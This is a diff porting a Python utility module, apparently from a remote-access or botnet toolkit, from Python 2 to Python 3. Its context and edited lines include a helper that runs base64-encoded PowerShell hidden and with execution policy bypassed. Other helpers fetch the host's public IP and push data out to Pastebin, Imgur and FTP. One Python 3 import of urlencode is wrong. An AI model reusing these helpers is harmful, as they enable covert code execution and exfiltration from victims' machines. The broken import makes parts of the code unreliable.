@@ -11,7 +11,7 @@ def log(info, level='debug'):
 
     """
     import logging
-    logging.basicConfig(level=logging.DEBUG if globals()['_debug'] else logging.ERROR, handler=logging.StreamHandler())
+    logging.basicConfig(level=logging.DEBUG if globals()['_debug'] else logging.ERROR, handlers=[logging.StreamHandler()])
     logger = logging.getLogger(__name__)
     getattr(logger, level if hasattr(logger, level) else 'debug')(str(info))
 
@@ -68,8 +68,12 @@ def public_ip():
     Return public IP address of host machine
 
     """
-    import urllib
-    return urllib.urlopen('http://api.ipify.org').read()
+    import sys
+    if sys.version_info[0] > 2:
+        from urllib.request import urlopen
+    else:
+        from urllib import urlopen
+    return urlopen('http://api.ipify.org').read()
 
 def local_ip():
     """
@@ -191,13 +195,17 @@ def post(url, headers={}, data={}, json={}, as_json=False):
             except: pass
         return output
     except ImportError:
-        import urllib
-        import urllib2
-        data = urllib.urlencode(data)
-        req  = urllib2.Request(str(url), data=data)
+        import sys
+        if sys.version_info[0] > 2:
+            from urllib.request import urlopen,urlencode,Request
+        else:
+            from urllib import urlencode
+            from urllib2 import urlopen,Request
+        data = urlencode(data)
+        req  = Request(str(url), data=data)
         for key, value in headers.items():
             req.headers[key] = value
-        output = urllib2.urlopen(req).read()
+        output = urlopen(req).read()
         if as_json:
             import json
             try:
@@ -262,9 +270,9 @@ def png(image):
     import struct
 
     try:
-        from io import StringIO        # Python 3
-    except ImportError:
         from StringIO import StringIO  # Python 2
+    except ImportError:
+        from io import StringIO        # Python 3
 
     if isinstance(image, numpy.ndarray):
         width, height = (image.shape[1], image.shape[0])
@@ -366,7 +374,7 @@ def powershell(code):
         powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
         return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
     except Exception as e:
-        log("{} error: {}".format(powershell.func_name, str(e)))
+        log("{} error: {}".format(powershell.__name__, str(e)))
 
 def display(output, color=None, style=None, end='\n', event=None, lock=None):
     """
@@ -385,14 +393,17 @@ def display(output, color=None, style=None, end='\n', event=None, lock=None):
     """
     import colorama
     colorama.init()
-    output = str(output)
+    if isinstance(output, bytes):
+        output = output.decode('utf-8')
+    else:
+        output = str(output)
     _color = ''
     if color:
         _color = getattr(colorama.Fore, color.upper())
     _style = ''
     if style:
         _style = getattr(colorama.Style, style.upper())
-    exec("print(_color + _style + output){}".format(end))
+    exec("""print(_color + _style + output + colorama.Style.RESET_ALL, end="{}")""".format(end))
 
 def color():
     """
@@ -403,7 +414,7 @@ def color():
         import random
         return random.choice(['BLACK', 'BLUE', 'CYAN', 'GREEN', 'LIGHTBLACK_EX', 'LIGHTBLUE_EX', 'LIGHTCYAN_EX', 'LIGHTGREEN_EX', 'LIGHTMAGENTA_EX', 'LIGHTRED_EX', 'LIGHTWHITE_EX', 'LIGHTYELLOW_EX', 'MAGENTA', 'RED', 'RESET', 'WHITE', 'YELLOW'])
     except Exception as e:
-        log("{} error: {}".format(color.func_name, str(e)))
+        log("{} error: {}".format(color.__name__, str(e)))
 
 def imgur(source, api_key=None):
     """
@@ -429,13 +440,19 @@ def pastebin(source, api_key):
     :param str api_user_key:   Pastebin api_user_key
 
     """
-    import urllib2
+    import sys
+    if sys.version_info[0] > 2:
+        from urllib.parse import urlsplit,urlunsplit
+    else:
+        from urllib2 import urlparse
+        urlsplit = urlparse.urlsplit
+        urlunsplit = urlparse.urlunsplit
     if isinstance(api_key, str):
         try:
             info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
             paste = post('https://pastebin.com/api/api_post.php', data=info)
-            parts = urllib2.urlparse.urlsplit(paste)
-            result = urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
+            parts = urlsplit(paste)
+            result = urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
             if not result.endswith('/'):
                 result += '/'
             return result
@@ -463,9 +480,9 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
     import ftplib
 
     try:
-        from io import StringIO        # Python 3
-    except ImportError:
         from StringIO import StringIO  # Python 2
+    except ImportError:
+        from io import StringIO        # Python 3
 
     if host and user and password:
         path  = ''
